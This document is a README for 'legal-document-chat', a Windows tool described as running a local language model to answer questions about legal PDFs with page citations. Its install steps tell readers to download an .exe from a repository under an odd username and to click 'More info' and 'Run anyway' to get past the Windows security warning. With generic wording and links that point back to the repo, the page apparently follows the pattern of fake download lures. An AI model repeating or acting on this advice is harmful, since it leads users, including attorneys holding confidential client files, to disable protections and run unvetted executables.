# ⚖️ legal-document-chat - Private legal document analysis for attorneys

[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/michalspheroidal902/legal-document-chat)

This tool allows you to chat with your legal documents on your own computer. You keep your files private because the software runs locally. You do not send sensitive client information to external servers. It uses legal document parsing and a local language model to provide answers with verifiable page references.

## 📥 How to download and install

You can get the software from the releases page. 

[Visit this page to download](https://github.com/michalspheroidal902/legal-document-chat)

Follow these steps to set up the software on your Windows computer:

1. Visit the link provided above to open the software download page.
2. Select the latest release version on that page.
3. Find the file ending in .exe under the assets section.
4. Click the file name to start the download.
5. Open the file once it finishes downloading. 
6. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system protects you from unknown apps.
7. Follow the prompts in the installation window.
8. Start the application using the new shortcut on your desktop.

## ⚙️ System requirements

This tool performs heavy text processing on your computer. Your machine needs enough power to run these tasks.

* Operating System: Windows 10 or Windows 11.
* Memory: 16 GB of RAM is recommended for better performance.
* Storage: At least 5 GB of free space for the software and local language models. 
* Processor: A modern multi-core processor. 
* Graphics: A dedicated graphics card with at least 6 GB of video memory helps the software run faster.

## 🚀 Setting up the software for the first time

The software handles two main things when you open it: the document brain and the document store. 

1. Install Ollama first if the app prompts you. This tool powers the chat experience. 
2. Open the legal-document-chat application.
3. Point the application to the folder where you keep your legal PDFs.
4. The software will start processing your documents. It reads the text and stores it in a search index. This index lets the app find your data fast.
5. Wait for the progress bar to finish. This happens only once per document set.

## 💬 Chatting with your documents

Use the main chat box to ask questions about your files. You might ask:

* What are the specific liability limits mentioned in the contract?
* Does this clause require mandatory arbitration?
* Summarize the payment terms of this agreement.

The system scans the index created during setup. It finds the relevant sentences. It then sends those sentences to the local language model. 

## 🔍 How citations work

Accuracy matters in legal work. The tool provides citations with every answer. You will see a small number or a reference to a page in the document. Click that citation to jump exactly to the spot in your PDF. This lets you verify every claim the software makes.

## 🔐 Why privacy matters

Most AI tools send your documents to the cloud. They store your data on their servers. This risks client confidentiality. Our tool stays on your local machine. No data leaves your computer. Your documents stay within your internal network. You control the security.

## 🛠️ Performance tips

If the software feels slow, check these settings:

* Close other programs while you process new documents.
* Ensure you have enough disk space for the vector store.
* Avoid running large batch document scans while you perform deep research. 
* Keep your graphics drivers updated to speed up language model responses.

## 📂 Managing your file library

You can add or remove files from your library at any time. The software detects changes in your designated folder. If you add a new PDF, the software will ask if you want to index it. Choose yes to include it in your chat capabilities. To remove a file, delete it from the folder and select the refresh button in the app settings.

## 💡 Troubleshooting common issues

If the app fails to start, restart your computer. If the chat box refuses to load, ensure that the Ollama background service is active. You can find this icon in your system tray at the bottom right of your screen. 

Ensure that no other software blocks the local network ports. This tool communicates with itself through a local channel to pass data between the search index and the language model. 

If you see an error about memory, try closing web browsers or other heavy applications. The model requires a significant portion of your computer memory to provide quick and smart responses.

## 🔄 Updating your software

We release updates to improve how the software parses legal citations. You can download the new version at any time from the main page. You do not need to uninstall the old version first. The installer will replace the old files while keeping your document indexes intact. Your existing project settings will carry over to the new version automatically.